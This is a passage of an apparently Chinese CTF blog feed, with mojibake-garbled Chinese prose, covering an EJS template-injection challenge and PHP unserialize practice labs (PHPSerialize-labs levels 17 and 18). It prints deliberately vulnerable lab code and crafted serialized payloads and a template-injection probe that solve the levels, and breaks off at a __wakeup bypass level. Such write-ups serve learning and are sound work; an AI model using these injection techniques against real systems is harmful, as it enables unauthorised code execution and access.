class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">const</span> username = users.<span class="title function_">get</span>(email); </span><br><span class="line"><span class="keyword">const</span> token = <span class="title function_">signToken</span>(&#123; email, username &#125;); </span><br><span class="line">res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, token, &#123; <span class="attr">httpOnly</span>: <span class="literal">true</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;lax&#x27;</span> &#125;); </span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); &#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line">res.<span class="title function_">clearCookie</span>(<span class="string">&#x27;token&#x27;</span>); res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); &#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123; </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listening on http://127.0.0.1:<span class="subst">$&#123;PORT&#125;</span>`</span>); &#125;);</span><br></pre></td></tr></table></figure><blockquote><p>æ¼æ´æ®µä»£ç </p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (token) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    currentUser = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// é£é™©ç‚¹ï¼šç›´æ¥æ¸²æŸ“æœªç»éªŒè¯çš„ç”¨æˆ·æ•°æ®</span></span><br><span class="line">      renderedUsername = ejs.<span class="title function_">render</span>(<span class="title class_">String</span>(currentUser.<span class="property">username</span>), &#123; <span class="attr">user</span>: currentUser, process &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      renderedUsername = currentUser.<span class="property">username</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œ<code>currentUser.username</code> ç›´æ¥ä½œä¸ºæ¨¡æ¿å†…å®¹ä¼ å…¥ <code>ejs.render()</code>ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶ JWT Token ä¸­çš„ <code>username</code> å­—æ®µå¹¶å†™å…¥æ¶æ„ EJS æ¨¡æ¿ä»£ç ï¼Œè¿™äº›ä»£ç å°±<strong>ä¼šåœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œ</strong></p><p>ä½†æ˜¯jsä¸€èˆ¬ä½œä¸ºå‰ç«¯è¯­è¨€ä½¿ç”¨ï¼Œè¦æƒ³ç¡®è®¤æ¨¡æ¿æ˜¯å¦åœ¨åç«¯æ¸²æŸ“ï¼Œå¯ä»¥ä½¿ç”¨</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;%= <span class="title class_">Date</span>.<span class="title function_">now</span>() %&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿”å›çš„æ˜¯æŒ‡ä»¤æœ¬èº«ï¼Œé‚£å°±æ˜¯åªåœ¨å®¢æˆ·ç«¯æ¸²æŸ“ï¼Œæ²¡åŠæ³•æ³¨å…¥ï¼Œå¦‚æœè¿”å›çš„æ˜¯æ—¶é—´ä»£ç ï¼Œé‚£å°±æ˜¯åœ¨æœåŠ¡ç«¯æ¸²æŸ“ï¼Œå°±æ˜¯ejsæ³¨å…¥ã€‚å°±æœ¬é¢˜è€Œè¨€ï¼Œä¼ å…¥åçš„å›æ˜¾æ˜¯<code>1763708518696</code>ï¼Œé‚£å°±æ˜¯åç«¯æ¸²æŸ“äº†</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ–(unserialize)</title>
      <link href="/2025/11/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(unserialize)/"/>
      <url>/2025/11/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(unserialize)/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h1><p>åœ¨ PHP ä¸­ï¼Œåºåˆ—åŒ– (Serialization)æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬åŒ–ä¸ºå¯å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼ï¼ˆé€šå¸¸æ˜¯å­—ç¬¦ä¸²ï¼‰çš„è¿‡ç¨‹ã€‚è€Œååºåˆ—åŒ– (Deserialization)åˆ™æ˜¯å°†åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²é‡æ–°è½¬æ¢å›å¯¹è±¡çš„è¿‡ç¨‹ã€‚ååºåˆ—åŒ–æ¼æ´çš„æœ¬è´¨æ˜¯ç¨‹åºåœ¨å¯¹ç”¨æˆ·æä¾›çš„åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œæ²¡æœ‰è¿›è¡Œå……åˆ†çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œè¿›è€Œæ‰§è¡Œæ¶æ„ä»£ç æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œ</p><br /><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><table><thead><tr><th align="left">é­”æœ¯æ–¹æ³•</th><th align="left">è°ƒç”¨æ—¶æœº</th><th>ä¼ é€’å‚æ•°</th><th>è¿”å›å€¼</th></tr></thead><tbody><tr><td align="left">__construct()</td><td align="left">å¯¹è±¡åˆ›å»ºæ—¶</td><td>æ ¹æ®å®é™…å®šä¹‰</td><td>æ— è¦æ±‚</td></tr><tr><td align="left">__destruct()</td><td align="left">å¯¹è±¡è¢«é”€æ¯æ—¶</td><td>ä¸å¯è®¾ç½®</td><td>æ— </td></tr><tr><td align="left">__call()</td><td align="left">è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶</td><td>$methodã€$arguments</td><td>è‡ªç”±å®šä¹‰</td></tr><tr><td align="left">__callStatic()</td><td align="left">è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„é™æ€æ–¹æ³•æ—¶</td><td>$methodã€$arguments</td><td>è‡ªç”±å®šä¹‰</td></tr><tr><td align="left">__get()</td><td align="left">è®¿é—®ä¸€ä¸ªå¯¹è±¡ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§æ—¶</td><td>$name</td><td>è‡ªç”±å®šä¹‰</td></tr><tr><td align="left">__set()</td><td align="left">è®¾ç½®ä¸€ä¸ªå¯¹è±¡ä¸å­˜åœ¨æˆ–ä¸å¯è®¾ç½®çš„å±æ€§æ—¶</td><td>$nameã€$values</td><td>é€šå¸¸æ— </td></tr><tr><td align="left">__isset()</td><td align="left">æ£€æŸ¥ä¸€ä¸ªå¯¹è±¡ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§æ—¶</td><td>$name</td><td>å¸ƒå°”å€¼</td></tr><tr><td align="left">__unset()</td><td align="left">unset()å‡½æ•°å°è¯•åˆ é™¤å¯¹è±¡ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§æ—¶</td><td>$name</td><td>æ— </td></tr><tr><td align="left">__sleep()</td><td align="left">åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–å‰</td><td>æ— </td><td>éœ€è¦è¢«åºåˆ—åŒ–çš„å±æ€§åçš„æ•°ç»„</td></tr><tr><td align="left">__wakeup()</td><td align="left">ååºåˆ—åŒ–ä¹‹å</td><td>æ— </td><td>æ— </td></tr><tr><td align="left">__toString()</td><td align="left">å¯¹è±¡è¢«éšå¼åœ°è½¬åŒ–ä¸ºå­—ç¬¦ä¸²æ—¶</td><td>ä¸æ¥å—</td><td>å­—ç¬¦ä¸²</td></tr><tr><td align="left">__invoke()</td><td align="left">è¢«ä½œä¸ºå‡½æ•°è°ƒç”¨æ—¶</td><td>ä»»æ„</td><td>ä»»ä½•</td></tr><tr><td align="left">__set_state()</td><td align="left">eval()å‡½æ•°å°†å¯¹è±¡å­—ç¬¦ä¸²è½¬åŒ–ä¸ºåŸå§‹å¯¹è±¡å</td><td>$data</td><td>å¯¹è±¡çš„å®ä¾‹</td></tr><tr><td align="left">__clone()</td><td align="left">ä½¿ç”¨cloneå…³é”®å­—å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œå…‹éš†æ—¶</td><td>æ— </td><td>ä¸éœ€è¦</td></tr><tr><td align="left">__autoload()</td><td align="left">å°è¯•ä½¿ç”¨ä¸€ä¸ªæœªå®šä¹‰çš„ç±»æ—¶</td><td>$name</td><td>ä¸éœ€è¦</td></tr><tr><td align="left">__debugInfo()</td><td align="left">å¯ä»¥æ§åˆ¶å¯¹è±¡åœ¨ä½¿ç”¨var_dump()å‡½æ•°æˆ–è°ƒè¯•æ—¶æ‰“å°çš„ä¿¡æ¯</td><td>æ— </td><td>æ•°ç»„ï¼ŒåŒ…å«åœ¨è°ƒè¯•è¾“å‡ºä¸­æ˜¾ç¤ºçš„å±æ€§åŠå…¶å€¼</td></tr></tbody></table><br /><br /><h2 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h2><p>ç¥å¥‡çš„å°ç‰¹æ€§ï¼Œä¸€èˆ¬ç”¨äºç»•è¿‡æŸäº›æ£€æŸ¥æˆ–é™åˆ¶</p><h3 id="å½“æˆå‘˜å±æ€§çš„å®é™…æ•°é‡ç¬¦åˆåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹åº”å±æ€§å€¼æ—¶ï¼Œä¸ä¼šè¿›è¡Œä»»ä½•æ£€æŸ¥"><a href="#å½“æˆå‘˜å±æ€§çš„å®é™…æ•°é‡ç¬¦åˆåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹åº”å±æ€§å€¼æ—¶ï¼Œä¸ä¼šè¿›è¡Œä»»ä½•æ£€æŸ¥" class="headerlink" title="å½“æˆå‘˜å±æ€§çš„å®é™…æ•°é‡ç¬¦åˆåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹åº”å±æ€§å€¼æ—¶ï¼Œä¸ä¼šè¿›è¡Œä»»ä½•æ£€æŸ¥"></a>å½“æˆå‘˜å±æ€§çš„å®é™…æ•°é‡ç¬¦åˆåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹åº”å±æ€§å€¼æ—¶ï¼Œä¸ä¼šè¿›è¡Œä»»ä½•æ£€æŸ¥</h3><h3 id="PHPSerializelabs-Level-17-å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-æ— ä¸­ç”Ÿæœ‰"><a href="#PHPSerializelabs-Level-17-å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-æ— ä¸­ç”Ÿæœ‰" class="headerlink" title="[PHPSerializelabs]Level 17: å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-æ— ä¸­ç”Ÿæœ‰"></a>[PHPSerializelabs]Level 17: å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-æ— ä¸­ç”Ÿæœ‰</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 17 : å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€ --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è§„åˆ™ç‰¹æ€§_æ— ä¸­ç”Ÿæœ‰ï¼šå½“æˆå‘˜å±æ€§çš„å®é™…æ•°é‡ç¬¦åˆåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹åº”å±æ€§å€¼æ—¶ï¼Œä¼¼ä¹ä¸ä¼šåšä»»ä½•æ£€æŸ¥ï¼Ÿ</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Class A is NULL: &#x27;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()).<span class="string">&quot;&#x27;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Class B is a class with 3 properties: &#x27;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>()).<span class="string">&quot;&#x27;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseString</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseString</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="variable">$serliseString</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After replace B with A,we unserialize it and dump :&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serliseString</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> <span class="keyword">instanceof</span> A &amp;&amp; <span class="variable">$a</span>-&gt;helloctfcmd == <span class="string">&quot;get_flag&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s rule?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">Class A is <span class="literal">NULL</span>: <span class="string">&#x27;O:1:&quot;A&quot;:0:&#123;&#125;&#x27;</span></span><br><span class="line">Class B is a <span class="class"><span class="keyword">class</span> <span class="title">with</span> 3 <span class="title">properties</span>: &#x27;<span class="title">O</span>:1:&quot;<span class="title">B</span>&quot;:3:</span>&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;*b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Bc&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">After replace B with A,we unserialize it and dump :</span></span><br><span class="line"><span class="string">object(A)#1 (3) &#123; [&quot;a&quot;]=&gt; string(5) &quot;Hello&quot; [&quot;b&quot;:protected]=&gt; string(3) &quot;CTF&quot; [&quot;c&quot;:&quot;A&quot;:private]=&gt; string(10) &quot;FLAG&#123;TEST&#125;&quot; &#125;</span></span><br></pre></td></tr></table></figure><p>æ›´æ”¹Bçš„å±æ€§åå°†åç§°æ›¿æ¢ä¸ºAå³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$helloctfcmd</span>=<span class="string">&quot;get_flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>());</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>O:1:&quot;B&quot;:4:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:4:&quot; * b&quot;;s:3:&quot;CTF&quot;;s:4:&quot; B c&quot;;s:10:&quot;FLAG{TEST}&quot;;s:11:&quot;helloctfcmd&quot;;s:8:&quot;get_flag&quot;;}</code></p><p>ä¿®æ”¹ä¼ é€’<code>o=O:1:&quot;A&quot;:4:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:4:&quot; * b&quot;;s:3:&quot;CTF&quot;;s:4:&quot; B c&quot;;s:10:&quot;FLAG{TEST}&quot;;s:11:&quot;helloctfcmd&quot;;s:8:&quot;get_flag&quot;;}</code>å³å¯</p><br /><h3 id="å­—ç¬¦ä¸²å°¾éƒ¨åˆ¤å®šï¼šè¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå½“æˆå‘˜å±æ€§çš„æ•°é‡ï¼Œåç§°é•¿åº¦ï¼Œå†…å®¹é•¿åº¦å‡ä¸€è‡´æ—¶ï¼Œç¨‹åºä¼šä»¥-â€œ-â€-ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“å°¾åˆ¤å®š"><a href="#å­—ç¬¦ä¸²å°¾éƒ¨åˆ¤å®šï¼šè¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå½“æˆå‘˜å±æ€§çš„æ•°é‡ï¼Œåç§°é•¿åº¦ï¼Œå†…å®¹é•¿åº¦å‡ä¸€è‡´æ—¶ï¼Œç¨‹åºä¼šä»¥-â€œ-â€-ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“å°¾åˆ¤å®š" class="headerlink" title="å­—ç¬¦ä¸²å°¾éƒ¨åˆ¤å®šï¼šè¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå½“æˆå‘˜å±æ€§çš„æ•°é‡ï¼Œåç§°é•¿åº¦ï¼Œå†…å®¹é•¿åº¦å‡ä¸€è‡´æ—¶ï¼Œç¨‹åºä¼šä»¥ â€œ;}â€ ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“å°¾åˆ¤å®š"></a>å­—ç¬¦ä¸²å°¾éƒ¨åˆ¤å®šï¼šè¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå½“æˆå‘˜å±æ€§çš„æ•°é‡ï¼Œåç§°é•¿åº¦ï¼Œå†…å®¹é•¿åº¦å‡ä¸€è‡´æ—¶ï¼Œç¨‹åºä¼šä»¥ â€œ;}â€ ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“å°¾åˆ¤å®š</h3><h4 id="PHPSerializelabs-Level-18-å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-å°¾éƒ¨åˆ¤å®š"><a href="#PHPSerializelabs-Level-18-å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-å°¾éƒ¨åˆ¤å®š" class="headerlink" title="[PHPSerializelabs]Level 18: å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-å°¾éƒ¨åˆ¤å®š"></a>[PHPSerializelabs]Level 18: å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-å°¾éƒ¨åˆ¤å®š</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 18 : å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€ --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è§„åˆ™ç‰¹æ€§,å­—ç¬¦ä¸²å°¾éƒ¨åˆ¤å®šï¼šè¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå½“æˆå‘˜å±æ€§çš„æ•°é‡ï¼Œåç§°é•¿åº¦ï¼Œå†…å®¹é•¿åº¦å‡ä¸€è‡´æ—¶ï¼Œç¨‹åºä¼šä»¥ &quot;;&#125;&quot; ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“å°¾åˆ¤å®šã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;GET_FLAG&quot;;&#125;FAKE_FLAG&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseStringDemo</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line"><span class="variable">$change</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;change&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseStringFLAG</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$target</span>, <span class="variable">$change</span>, <span class="variable">$serliseStringDemo</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serliseStringFLAG</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$FLAG</span> <span class="keyword">instanceof</span> FLAG &amp;&amp; <span class="variable">$FLAG</span>-&gt;key == <span class="string">&#x27;GET_FLAG&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">SerliseStringDemo:<span class="string">&#x27;O:4:&quot;Demo&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:20:&quot;GET_FLAG&quot;;&#125;FAKE_FLAG&quot;;&#125;&#x27;</span></span><br><span class="line">Change SOMETHING TO GET FLAGYour serliaze <span class="keyword">string</span> is O:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;GET_FLAG&quot;</span>;&#125;FAKE_FLAG<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">And Here is object(Demo)#1 (3) &#123; [&quot;</span>a<span class="string">&quot;]=&gt; string(5) &quot;</span>Hello<span class="string">&quot; [&quot;</span>b<span class="string">&quot;]=&gt; string(3) &quot;</span>CTF<span class="string">&quot; [&quot;</span>key<span class="string">&quot;]=&gt; string(20) &quot;</span>GET_FLAG<span class="string">&quot;;&#125;FAKE_FLAG&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§è¿›è¡Œæˆªæ–­ï¼Œåªéœ€è¦æŠŠå¯¹è±¡å<code>&quot;Demo&quot;</code>æ›¿æ¢ä¸º<code>&quot;FLAG&quot;</code>ï¼Œå­—ç¬¦æ•°<code>20</code>æ›¿æ¢ä¸º<code>8</code>å³å¯</p><p>ä¼ é€’<code>target=O:4:&quot;Demo&quot;:3:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:20:&quot;GET_FLAG&quot;;}FAKE_FLAG&quot;;}</code></p><p><code>&amp;change=O:4:&quot;FLAG&quot;:3:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:8:&quot;GET_FLAG&quot;;}</code></p><p>è·å¾—flag</p><br /><h3 id="å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹è±¡å±æ€§çš„å€¼å¤§äºçœŸå®å±æ€§å€¼æ—¶ä¾¿ä¼šè·³è¿‡-wakeupçš„æ‰§è¡Œ"><a href="#å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹è±¡å±æ€§çš„å€¼å¤§äºçœŸå®å±æ€§å€¼æ—¶ä¾¿ä¼šè·³è¿‡-wakeupçš„æ‰§è¡Œ" class="headerlink" title="å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹è±¡å±æ€§çš„å€¼å¤§äºçœŸå®å±æ€§å€¼æ—¶ä¾¿ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ"></a>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹è±¡å±æ€§çš„å€¼å¤§äºçœŸå®å±æ€§å€¼æ—¶ä¾¿ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</h3><h4 id="PHPSerializelabs-Level-11-wakeup-CVE-2016-7124"><a href="#PHPSerializelabs-Level-11-wakeup-CVE-2016-7124" class="headerlink" title="[PHPSerializelabs]Level 11: __wakeup() CVE-2016-7124"></a>[PHPSerializelabs]Level 11: __wakeup() CVE-2016-7124</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 11 : Bypass weakup! --- 